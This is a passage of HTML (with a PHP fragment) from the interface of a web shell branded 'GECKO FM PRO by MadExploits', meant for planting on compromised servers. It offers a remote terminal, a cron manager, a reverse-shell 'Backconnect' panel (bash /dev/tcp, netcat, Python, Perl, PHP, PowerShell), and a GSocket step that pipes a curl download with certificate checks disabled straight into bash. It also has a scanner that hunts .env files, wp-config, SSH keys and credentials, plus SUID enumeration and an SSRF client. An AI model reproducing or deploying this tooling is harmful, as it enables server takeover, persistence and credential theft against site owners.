      <div class="logo-name">GECKO FM <em>PRO</em></div>
      <div class="logo-sub">by <b>MadExploits</b></div>
    </div>
  </div>

  <div class="search-wrap">
    <svg class="search-ico" viewBox="0 0 16 16"><path d="M10.68 11.74a6 6 0 0 1-7.922-8.982 6 6 0 0 1 8.982 7.922l3.04 3.04a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215ZM11.5 7a4.499 4.499 0 1 0-8.997 0A4.499 4.499 0 0 0 11.5 7Z"/></svg>
    <input type="search" id="searchInput" placeholder="Search files…" autocomplete="off">
    <div class="kbd-hint"><kbd>Ctrl</kbd><kbd>K</kbd></div>
    <div class="sr-list" id="srList"></div>
  </div>

  <div class="topbar-right">
    <div class="view-pills">
      <button class="view-pill" id="btnList" title="List view">
        <svg viewBox="0 0 16 16"><path d="M2 2.75A.75.75 0 0 1 2.75 2h10.5a.75.75 0 0 1 0 1.5H2.75A.75.75 0 0 1 2 2.75Zm0 5A.75.75 0 0 1 2.75 7h10.5a.75.75 0 0 1 0 1.5H2.75A.75.75 0 0 1 2 7.75ZM2.75 12h10.5a.75.75 0 0 1 0 1.5H2.75a.75.75 0 0 1 0-1.5Z"/></svg>
      </button>
      <button class="view-pill" id="btnGrid" title="Grid view">
        <svg viewBox="0 0 16 16"><path d="M1 2.75A1.75 1.75 0 0 1 2.75 1h2.5A1.75 1.75 0 0 1 7 2.75v2.5A1.75 1.75 0 0 1 5.25 7h-2.5A1.75 1.75 0 0 1 1 5.25Zm8.75-1.75A1.75 1.75 0 0 0 8 2.75v2.5A1.75 1.75 0 0 0 9.75 7h2.5A1.75 1.75 0 0 0 14 5.25v-2.5A1.75 1.75 0 0 0 12.25 1ZM1 9.75A1.75 1.75 0 0 1 2.75 8h2.5A1.75 1.75 0 0 1 7 9.75v2.5A1.75 1.75 0 0 1 5.25 14h-2.5A1.75 1.75 0 0 1 1 12.25Zm8.75-1.75A1.75 1.75 0 0 0 8 9.75v2.5A1.75 1.75 0 0 0 9.75 14h2.5A1.75 1.75 0 0 0 14 12.25v-2.5A1.75 1.75 0 0 0 12.25 8Z"/></svg>
      </button>
    </div>
    <button class="btn btn-ghost btn-icon" id="btnRefresh" title="Refresh (F5)">
      <svg viewBox="0 0 16 16"><path d="M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.745l-1.067-1.067A.25.25 0 0 1 11.5 10.25H16v4.5a.25.25 0 0 1-.427.177l-1.068-1.068a7.002 7.002 0 0 1-11.772-3.603.75.75 0 0 1 .672-.751ZM.75 8.005a.75.75 0 0 1 1.072-.696 7.002 7.002 0 0 1 11.772 3.603.75.75 0 0 1-.672.751 5.502 5.502 0 0 0-9.592-2.745L3.545 11.64A.25.25 0 0 1 3.118 12H0V7.5a.25.25 0 0 1 .427-.177l1.068 1.068A6.999 6.999 0 0 1 .75 8.005Z"/></svg>
    </button>
    <button class="btn btn-term" id="btnTerm">
      <svg viewBox="0 0 16 16"><path d="M0 2.75C0 1.784.784 1 1.75 1h12.5c.966 0 1.75.784 1.75 1.75v10.5A1.75 1.75 0 0 1 14.25 15H1.75A1.75 1.75 0 0 1 0 13.25Zm1.75-.25a.25.25 0 0 0-.25.25v10.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25V2.75a.25.25 0 0 0-.25-.25ZM7.25 8.5l-2.5 2.5a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L5.94 8 3.215 5.059A.749.749 0 0 1 4.49 4.49L7.25 7.25v1.25Zm1.5 1.5h3a.75.75 0 0 1 0 1.5h-3a.75.75 0 0 1 0-1.5Z"/></svg>
      Terminal
    </button>
  </div>
</header>

<div class="body">

  <div class="sb-backdrop" id="sbBackdrop" aria-hidden="true"></div>

  <aside class="sidebar" id="sidebar">
   <div class="sb-scroll">
    <div class="sidebar-top">
      <div class="sidebar-label">
        <svg viewBox="0 0 24 24"><path d="M12 5v14M5 12h14"/></svg>
        Files
      </div>
      <button class="sb-btn" id="sbNewFile">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/><path d="M12 18v-6M9 15h6"/></svg></span>
        New File
        <span class="sb-arrow">›</span>
      </button>
      <button class="sb-btn" id="sbNewFolder">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M3 5a2 2 0 0 1 2-2h4l2 3h7a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M12 12v4M10 14h4"/></svg></span>
        New Folder
        <span class="sb-arrow">›</span>
      </button>
      <button class="sb-btn" id="sbUpload">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="M17 8l-5-5-5 5"/><path d="M12 3v12"/></svg></span>
        Upload Files
        <span class="sb-arrow">›</span>
      </button>
      <button class="sb-btn danger" id="sbDelSel" aria-disabled="true">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M3 6h18"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><path d="M10 11v6M14 11v6"/></svg></span>
        Delete Selected
        <span class="sb-arrow">›</span>
      </button>
    </div>

    <div class="sidebar-divider"></div>

    <div class="sidebar-top" style="padding-top:8px">
      <div class="sidebar-label">
        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/></svg>
        Tools
      </div>
      <button class="sb-btn" id="sbRefresh">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M3 12a9 9 0 0 1 15.18-6.36L21 8"/><path d="M21 3v5h-5"/><path d="M21 12a9 9 0 0 1-15.18 6.36L3 16"/><path d="M3 21v-5h5"/></svg></span>
        Refresh
        <span class="sb-arrow">›</span>
      </button>
      <button class="sb-btn" id="sbTerm">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 9l3 3-3 3M12 15h6"/></svg></span>
        Terminal
        <span class="sb-arrow">›</span>
      </button>
      <button class="sb-btn" id="sbCron">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg></span>
        Cron Manager
        <span class="sb-arrow">›</span>
      </button>
      <button class="sb-btn" id="sbBackconnect">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M9 14L4 9l5-5"/><path d="M4 9h10a5 5 0 0 1 5 5v1"/></svg></span>
        Backconnect
        <span class="sb-arrow">›</span>
      </button>
      <button class="sb-btn" id="sbGsocket">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5M2 12l10 5 10-5"/></svg></span>
        GSocket
        <span class="sb-arrow">›</span>
      </button>
      <button class="sb-btn" id="sbPortScan">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M7 8h4M7 12h10M7 16h7"/></svg></span>
        Port Scanner
        <span class="sb-arrow">›</span>
      </button>
      <button class="sb-btn" id="sbAdminer">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><ellipse cx="12" cy="5" rx="8" ry="3"/><path d="M4 5v14c0 1.66 3.58 3 8 3s8-1.34 8-3V5"/><path d="M4 12c0 1.66 3.58 3 8 3s8-1.34 8-3"/></svg></span>
        Adminer (DB)
        <span class="sb-arrow">›</span>
      </button>
    </div>

    <div class="sidebar-divider"></div>

    <div class="sidebar-top" style="padding-top:8px">
      <div class="sidebar-label">
        <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
        Cyber Security
      </div>
      <button class="sb-btn" id="sbSecHub">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg></span>
        Security Hub
        <span class="sb-arrow">›</span>
      </button>
      <button class="sb-btn" id="sbSecRecon">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.35-4.35"/></svg></span>
        System Recon
        <span class="sb-arrow">›</span>
      </button>
      <button class="sb-btn" id="sbSecSensitive">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/><path d="M12 11v6M9 14h6"/></svg></span>
        Sensitive Scanner
        <span class="sb-arrow">›</span>
      </button>
      <button class="sb-btn" id="sbSecHttp">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M2 12h20M12 2a15 15 0 0 1 0 20M12 2a15 15 0 0 0 0 20"/></svg></span>
        HTTP Client
        <span class="sb-arrow">›</span>
      </button>
    </div>

    <div class="sidebar-divider"></div>

    <div class="sidebar-top" style="padding-top:8px">
      <div class="sidebar-label">
        <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M12 8v4M12 16h.01"/></svg>
        Blue Team
      </div>
      <button class="sb-btn" id="sbBlueHub">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M12 3l7 4v5c0 5-3.5 8.5-7 9-3.5-.5-7-4-7-9V7l7-4z"/><path d="M9 12l2 2 4-4"/></svg></span>
        Blue Team Hub
        <span class="sb-arrow">›</span>
      </button>
      <button class="sb-btn" id="sbBlueBackdoor">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M12 2a4 4 0 0 1 4 4c0 1.5-.8 2.8-2 3.5V12h3a3 3 0 0 1 3 3v1H7v-1a3 3 0 0 1 3-3h3V9.5A4 4 0 0 1 12 2z"/><path d="M9 19h6"/></svg></span>
        Backdoor Scanner
        <span class="sb-arrow">›</span>
      </button>
      <button class="sb-btn" id="sbBlueAudit">
        <span class="sb-ico"><svg viewBox="0 0 24 24"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg></span>
        Full Security Audit
        <span class="sb-arrow">›</span>
      </button>
    </div>

   </div><!-- /.sb-scroll -->

   <div class="sb-foot">
    <div class="drive-box" id="driveBox">
      <div class="disk-label">Path Navigation</div>
      <select id="driveSelect">
        <option value="">— Select Path —</option>
      </select>
    </div>

    <div class="disk-box" id="diskBox">
      <div class="disk-label">Storage</div>
      <div class="disk-track"><div class="disk-fill" id="diskFill" style="width:0%"></div></div>
      <div class="disk-meta"><span id="diskUsed">—</span><span id="diskPct">—</span></div>
    </div>

    <div class="sidebar-sys" id="sysInfo"><strong>Environment</strong>Loading…</div>
   </div>
  </aside>

  <main class="main">
    <div class="actionbar">
      <nav class="breadcrumb" id="breadcrumb"></nav>
      <button class="btn btn-ghost btn-icon" id="btnUp" title="Go up" style="visibility:hidden">
        <svg viewBox="0 0 16 16"><path d="m7.78 12.53-4.25-4.25a.749.749 0 0 1 0-1.061l4.25-4.25a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L4.811 7.25h7.939a.75.75 0 0 1 0 1.5H4.811l2.829 2.829a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215Z"/></svg>
      </button>
      <button class="btn btn-primary btn-sm" onclick="showCreate('file')">
        <svg viewBox="0 0 16 16"><path d="M7.75 2a.75.75 0 0 1 .75.75V7h4.25a.75.75 0 0 1 0 1.5H8.5v4.25a.75.75 0 0 1-1.5 0V8.5H2.75a.75.75 0 0 1 0-1.5H7V2.75A.75.75 0 0 1 7.75 2Z"/></svg>
        New
      </button>
    </div>

    <div class="panel" id="panel">
      <div class="empty" id="loading">
        <div class="empty-ico"><svg class="spin" viewBox="0 0 16 16"><path d="M8 0a8 8 0 0 1 8 8h-1.5A6.5 6.5 0 0 0 8 1.5V0Z" fill="currentColor"/></svg></div>
        <h3>Loading workspace…</h3>
        <p>Fetching your files</p>
      </div>
    </div>

    <div class="statusbar" id="statusbar">
      <div class="pulse-dot"></div>
      <span id="stItems">—</span>
      <span id="stDisk">—</span>
      <span id="stClock">—</span>
      <span class="st-right" id="stPath">—</span>
    </div>
  </main>
</div></div><div class="overlay" id="mCreate">
  <div class="modal m-sm">
    <div class="modal-head"><h2 id="createTitle">New File</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <div class="fg"><label>Name</label><input type="text" id="createName" placeholder="filename.ext"></div>
      <div class="fg hidden" id="createContentWrap"><label>Initial content (optional)</label><textarea id="createContent" rows="4"></textarea></div>
    </div>
    <div class="modal-foot"><button class="btn mc">Cancel</button><button class="btn btn-primary" id="createOk">Create</button></div>
  </div>
</div>

<div class="overlay" id="mRename">
  <div class="modal m-sm">
    <div class="modal-head"><h2>Rename</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body"><div class="fg"><label>New name</label><input type="text" id="renameInput"></div></div>
    <div class="modal-foot"><button class="btn mc">Cancel</button><button class="btn btn-primary" id="renameOk">Rename</button></div>
  </div>
</div>

<div class="overlay" id="mChmod">
  <div class="modal m-sm">
    <div class="modal-head"><h2>Permissions (Chmod)</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <div class="fg">
        <label>Izin Oktal (contoh: 0755, 0644)</label>
        <input type="text" id="chmodInput" placeholder="0644" maxlength="4">
      </div>
    </div>
    <div class="modal-foot"><button class="btn mc">Cancel</button><button class="btn btn-primary" id="chmodOk">Apply</button></div>
  </div>
</div>

<div class="overlay" id="mDelete">
  <div class="modal m-sm">
    <div class="modal-head"><h2>Delete</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body"><p id="deleteMsg" style="color:var(--tx2);font-size:14px;line-height:1.6"></p></div>
    <div class="modal-foot"><button class="btn mc">Cancel</button><button class="btn btn-danger" id="deleteOk">Delete</button></div>
  </div>
</div>

<div class="overlay" id="mUpload">
  <div class="modal m-md">
    <div class="modal-head"><h2>Upload Files</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <div class="dropzone" id="dropzone">
        <svg viewBox="0 0 16 16"><path d="M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 14.25 14H2.75Z"/><path d="M7.25 7.567V1.75a.75.75 0 0 1 1.5 0v5.817l1.78-1.347a.75.75 0 1 1 1.042 1.078l-3.25 3.25a.75.75 0 0 1-1.06 0L3.53 7.28a.75.75 0 0 1 1.06-1.06l2.66 2.347Z"/></svg>
        <p>Drag &amp; drop files here or <strong>click to browse</strong></p>
        <p style="font-size:11px;margin-top:6px;color:var(--tx4)">Uploads to current folder</p>
        <p style="font-size:10px;margin-top:4px;color:var(--tx4)">Max file size: <?php echo ini_get('upload_max_filesize'); ?></p>
      </div>
      <input type="file" id="fileInput" multiple class="hidden">
    </div>
  </div>
</div>

<div class="overlay" id="mEditor">
  <div class="modal m-full">
    <div class="modal-head">
      <h2 id="edTitle">Edit File</h2>
      <span class="path-tag" id="edPath"></span>
      <button class="btn btn-ghost btn-icon mc">✕</button>
    </div>
    <div class="modal-body" style="padding:0;display:flex;flex-direction:column">
      <div class="editor-wrap">
        <div class="line-nums" id="lineNums"></div>
        <div class="ed-area" id="edArea">
          <pre class="ed-highlight" id="edHighlight" aria-hidden="true"></pre>
          <textarea id="edText" spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
        </div>
      </div>
    </div>
    <div class="modal-foot">
      <span class="left" id="edMeta"></span>
      <button class="btn mc">Cancel</button>
      <button class="btn btn-primary" id="edSave">
        <svg viewBox="0 0 16 16"><path d="M2.75 1A1.75 1.75 0 0 0 1 2.75v10.5c0 .966.784 1.75 1.75 1.75h10.5A1.75 1.75 0 0 0 15 13.25V2.75A1.75 1.75 0 0 0 13.25 1H2.75ZM3.5 6.25V2.5h4.75v3.75H3.5Zm9 7.25H3.5V9.5h9v4Z"/></svg>
        Save
      </button>
    </div>
  </div>
</div>

<div class="overlay" id="mImagePreview">
  <div class="modal m-lg">
    <div class="modal-head">
      <h2 id="ipTitle">Preview</h2>
      <span class="path-tag" id="ipPath"></span>
      <div class="ip-tabs" role="tablist">
        <button class="ip-tab active" data-tab="image" type="button">Image</button>
        <button class="ip-tab" data-tab="text" type="button">Text</button>
      </div>
      <button class="btn btn-ghost btn-icon mc">✕</button>
    </div>
    <div class="modal-body" style="padding:14px">
      <div class="ip-pane ip-image" id="ipImagePane">
        <img id="ipImg" alt="">
        <div class="img-info" id="ipImgInfo"></div>
      </div>
      <div class="ip-pane ip-text hidden" id="ipTextPane">
        <pre id="ipTextContent">Loading…</pre>
      </div>
    </div>
    <div class="modal-foot">
      <span class="left" id="ipMeta"></span>
      <button class="btn mc">Close</button>
      <a class="btn btn-primary" id="ipDownload" download>
        <svg viewBox="0 0 16 16"><path d="M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 14.25 14H2.75Z"/><path d="M7.25 7.567V1.75a.75.75 0 0 1 1.5 0v5.817l1.78-1.347a.75.75 0 1 1 1.042 1.078l-3.25 3.25a.75.75 0 0 1-1.06 0L3.53 7.28a.75.75 0 0 1 1.06-1.06l2.66 2.347Z"/></svg>
        Download
      </a>
    </div>
  </div>
</div>

<div class="overlay term-modal" id="mTerm">
  <div class="modal m-lg" style="height:78vh">
    <div class="modal-head">
      <h2>Terminal</h2>
      <span class="path-tag" id="termPathTag">root</span>
      <button class="btn btn-ghost btn-icon mc">✕</button>
    </div>
    <div class="modal-body">
      <div class="term-top">
        <div class="term-dots" aria-hidden="true"><i></i><i></i><i></i></div>
        <div class="term-title-area">
          <div class="term-title">
            <svg class="term-title-icon" viewBox="0 0 24 24" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 8l4 4-4 4"/><path d="M12 16h7"/></svg>
            Gecko Shell
          </div>
          <div class="term-cwd" id="termCwd">~</div>
        </div>
        <div class="term-actions">
          <span class="term-stats" id="termStats" title="Commands executed"><b id="termCount">0</b><span>cmds</span></span>
          <button class="term-btn" id="termCopy" title="Copy all output">
            <svg viewBox="0 0 16 16"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"/></svg>
          </button>
          <button class="term-btn" id="termClear" title="Clear (Ctrl+L)">
            <svg viewBox="0 0 16 16"><path d="M11 1.75V3h2.25a.75.75 0 0 1 0 1.5H2.75a.75.75 0 0 1 0-1.5H5V1.75C5 .784 5.784 0 6.75 0h2.5C10.216 0 11 .784 11 1.75ZM4.496 6.675l.66 6.6a.25.25 0 0 0 .249.225h5.19a.25.25 0 0 0 .249-.225l.66-6.6a.75.75 0 0 1 1.492.149l-.66 6.6A1.75 1.75 0 0 1 10.595 15h-5.19a1.75 1.75 0 0 1-1.741-1.575l-.66-6.6a.75.75 0 1 1 1.492-.15ZM6.5 1.75V3h3V1.75a.25.25 0 0 0-.25-.25h-2.5a.25.25 0 0 0-.25.25Z"/></svg>
          </button>
        </div>
      </div>
      <div class="term-out" id="termOut"></div>
      <div class="term-in-row">
        <div class="term-prompt-area">
          <span class="term-prompt-user">gecko</span><span class="term-prompt-at">@</span><span class="term-prompt-host">shell</span><span class="term-prompt-colon">:</span><span class="term-prompt-cwd" id="termPromptCwd">~</span>
          <span class="term-prompt-mark">❯</span>
        </div>
        <input type="text" id="termIn" placeholder="Type a command…" autocomplete="off" spellcheck="false">
        <div class="term-spinner" id="termSpinner" aria-hidden="true"></div>
        <div class="term-hint">
          <span><span class="kbd">↑↓</span>history</span>
          <span><span class="kbd">⏎</span>run</span>
        </div>
      </div>
    </div>
  </div>
</div>

<div class="overlay" id="mCron">
  <div class="modal m-lg">
    <div class="modal-head"><h2>⏰ Cron Manager</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <p class="tool-note" id="cronPlatformNote">Loading crontab…</p>
      <div class="fg"><label>Crontab entries</label><textarea id="cronContent" rows="14" spellcheck="false" placeholder="* * * * * /usr/bin/php /path/to/script.php"></textarea></div>
    </div>
    <div class="modal-foot">
      <button class="btn mc">Close</button>
      <button class="btn btn-ghost" id="cronReload">Reload</button>
      <button class="btn btn-primary" id="cronSave">Save Crontab</button>
    </div>
  </div>
</div>

<div class="overlay" id="mBackconnect">
  <div class="modal m-md">
    <div class="modal-head"><h2>🔗 Backconnect</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <div class="tool-grid">
        <div class="fg"><label>Your IP / Host</label><input type="text" id="bcIp" placeholder="192.168.1.100"></div>
        <div class="fg"><label>Port</label><input type="number" id="bcPort" value="4444" min="1" max="65535"></div>
        <div class="fg span2"><label>Method</label>
          <select id="bcMethod">
            <option value="bash">Bash (/dev/tcp)</option>
            <option value="nc">Netcat (nc)</option>
            <option value="python">Python</option>
            <option value="perl">Perl</option>
            <option value="php">PHP</option>
            <option value="powershell">PowerShell (Windows)</option>
          </select>
        </div>
      </div>
      <p class="tool-note">Start listener first: <code>nc -lvnp PORT</code> or <code>rlwrap nc -lvnp PORT</code></p>
      <div class="tool-output empty" id="bcOutput">Ready — connection runs in background.</div>
    </div>
    <div class="modal-foot">
      <button class="btn mc">Close</button>
      <button class="btn btn-primary" id="bcStart">Start Backconnect</button>
    </div>
  </div>
</div>

<div class="overlay" id="mGsocket">
  <div class="modal m-lg">
    <div class="modal-head"><h2>⚡ GSocket</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <div class="tool-grid">
        <div class="fg span2"><label>Download method</label>
          <select id="gsMethod">
            <option value="curl">curl — GS_NOCERTCHECK=1 bash -c "$(curl -fsSLk …)"</option>
            <option value="wget">wget — GS_NOCERTCHECK=1 bash -c "$(wget --no-check-certificate …)"</option>
          </select>
        </div>
      </div>
      <div class="tool-cmd" id="gsCmdPreview">GS_NOCERTCHECK=1 bash -c "$(curl -fsSLk https://gsocket.io/y)"</div>
      <p class="tool-note">Installer dari gsocket.io/y. Jika GSRN firewalled, otomatis retry <code>GS_PORT=22</code> s/d <code>67</code>.</p>
      <div class="tool-output tall empty" id="gsOutput">Klik Run untuk mengeksekusi installer GSocket.</div>
    </div>
    <div class="modal-foot">
      <span class="left" id="gsMeta">—</span>
      <button class="btn btn-ghost" id="gsCopy" title="Copy output">Copy Output</button>
      <button class="btn mc">Close</button>
      <button class="btn btn-primary" id="gsRun">Run GSocket</button>
    </div>
  </div>
</div>

<div class="overlay" id="mPortScan">
  <div class="modal m-lg">
    <div class="modal-head"><h2>🌐 Port Scanner</h2><button class="btn btn-ghost btn-icon mc">✕</button></div>
    <div class="modal-body">
      <div class="tool-grid">
        <div class="fg"><label>Target Host</label><input type="text" id="psHost" value="127.0.0.1" placeholder="127.0.0.1"></div>
        <div class="fg"><label>Ports</label><input type="text" id="psPorts" value="21,22,25,80,443,3306,8080" placeholder="22,80,443 or 1-1024"></div>
        <div class="fg"><label>Timeout (sec)</label><input type="number" id="psTimeout" value="1" min="1" max="5"></div>
      </div>
      <div class="tool-output empty" id="psOutput">Enter target and click Scan.</div>
      <div class="tool-tags" id="psTags"></div>
    </div>
    <div class="modal-foot">
      <button class="btn mc">Close</button>
      <button class="btn btn-primary" id="psScan">Scan Ports</button>
    </div>
  </div>
</div>

<div class="overlay" id="mAdminer">
  <div class="modal m-full">
    <div class="modal-head">
      <h2>🗄️ Adminer (DB Manager)</h2>
      <button class="btn btn-ghost btn-sm" id="dbOpenAdminer" title="Open full Adminer">Full Adminer ↗</button>
      <button class="btn btn-ghost btn-icon mc">✕</button>
    </div>
    <div class="modal-body">
      <div class="tool-grid">
        <div class="fg"><label>Type</label>
          <select id="dbType">
            <option value="mysql">MySQL</option>
            <option value="pgsql">PostgreSQL</option>
            <option value="sqlite">SQLite</option>
          </select>
        </div>
        <div class="fg"><label>Host</label><input type="text" id="dbHost" value="127.0.0.1"></div>
        <div class="fg"><label>Port</label><input type="number" id="dbPort" value="3306"></div>
        <div class="fg"><label>User</label><input type="text" id="dbUser" value="root"></div>
        <div class="fg"><label>Password</label><input type="password" id="dbPass" autocomplete="off"></div>
        <div class="fg"><label>Database</label><input type="text" id="dbName" placeholder="database name"></div>
      </div>
      <div class="db-tables" id="dbTables"></div>
      <div class="fg" style="margin-top:14px"><label>SQL Query</label><textarea id="dbSql" rows="5" spellcheck="false" placeholder="SELECT * FROM users LIMIT 10;"></textarea></div>
      <div id="dbResult"></div>
    </div>
    <div class="modal-foot">
      <span class="left" id="dbMeta">Built-in PDO query runner</span>
      <button class="btn btn-ghost" id="dbTablesBtn">List Tables</button>
      <button class="btn btn-primary" id="dbRun">Run Query</button>
    </div>
  </div>
</div>

<div class="overlay" id="mSecHub">
  <div class="modal m-full">
    <div class="modal-head">
      <h2>🛡️ Cyber Security Hub</h2>
      <button class="btn btn-ghost btn-sm" id="secPhpinfo" title="Open PHPInfo">PHPInfo ↗</button>
      <button class="btn btn-ghost btn-icon mc">✕</button>
    </div>
    <div class="modal-body" style="padding:0;display:flex;flex-direction:column">
      <div class="sec-tabs ip-tabs" role="tablist">
        <button class="ip-tab active" data-sec="recon" type="button">Recon</button>
        <button class="ip-tab" data-sec="sensitive" type="button">Sensitive</button>
        <button class="ip-tab" data-sec="processes" type="button">Processes</button>
        <button class="ip-tab" data-sec="network" type="button">Network</button>
        <button class="ip-tab" data-sec="http" type="button">HTTP</button>
        <button class="ip-tab" data-sec="hash" type="button">Hash</button>
        <button class="ip-tab" data-sec="codec" type="button">Codec</button>
        <button class="ip-tab" data-sec="dns" type="button">DNS</button>
        <button class="ip-tab" data-sec="suid" type="button">SUID/SGID</button>
      </div>
      <div style="padding:16px;overflow:auto;flex:1">

        <div class="sec-panel active" data-panel="recon">
          <div class="sec-actions">
            <button class="btn btn-primary btn-sm" id="secRunRecon">Run System Recon</button>
            <button class="btn btn-ghost btn-sm" id="secCopyRecon">Copy</button>
          </div>
          <div class="tool-output tall empty" id="secOutRecon">System info, user/privilege, PHP security restrictions, kernel &amp; env.</div>
        </div>

        <div class="sec-panel" data-panel="sensitive">
          <div class="tool-grid">
            <div class="fg span2"><label>Scan path (optional)</label><input type="text" id="secSensPath" placeholder="Leave empty = base + common dirs"></div>
          </div>
          <div class="sec-actions">
            <button class="btn btn-primary btn-sm" id="secRunSensitive">Scan Sensitive Files</button>
          </div>
          <p class="tool-note">Hunts .env, wp-config, SSH keys, .git/config, SQL dumps, credentials…</p>
          <div class="tool-output tall empty" id="secOutSensitive">Click Scan to search.</div>
        </div>

        <div class="sec-panel" data-panel="processes">
          <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunProcesses">List Processes</button></div>
          <div class="tool-output tall empty" id="secOutProcesses">ps aux / tasklist output.</div>
        </div>

        <div class="sec-panel" data-panel="network">
          <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunNetwork">Show Network</button></div>
          <div class="tool-output tall empty" id="secOutNetwork">Listening ports, connections, interfaces.</div>
        </div>

        <div class="sec-panel" data-panel="http">
          <div class="tool-grid">
            <div class="fg span2"><label>URL</label><input type="text" id="secHttpUrl" placeholder="https://example.com/api"></div>
            <div class="fg"><label>Method</label>
              <select id="secHttpMethod">
                <option>GET</option><option>POST</option><option>PUT</option><option>PATCH</option><option>DELETE</option><option>HEAD</option>
              </select>
            </div>
            <div class="fg span2"><label>Headers (one per line)</label><textarea id="secHttpHeaders" rows="2" placeholder="User-Agent: GeckoSec&#10;Accept: */*"></textarea></div>
            <div class="fg span2"><label>Body</label><textarea id="secHttpBody" rows="3" placeholder="POST body…"></textarea></div>
          </div>
          <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunHttp">Send Request</button></div>
          <div class="tool-output tall empty" id="secOutHttp">HTTP client for SSRF/recon testing.</div>
        </div>

        <div class="sec-panel" data-panel="hash">
          <div class="tool-grid">
            <div class="fg"><label>Algorithm</label>
              <select id="secHashAlgo"><option value="md5">MD5</option><option value="sha1">SHA1</option><option value="sha256" selected>SHA256</option><option value="sha512">SHA512</option><option value="crc32">CRC32</option></select>
            </div>
            <div class="fg span2"><label>Input</label><textarea id="secHashText" rows="4" placeholder="Text to hash…"></textarea></div>
          </div>
          <div class="sec-actions"><button class="btn btn-primary btn-sm" id="secRunHash">Generate Hash</button></div>
          <div class="tool-output tall empty" id="secOutHash">Hash output.</div>
        </div>

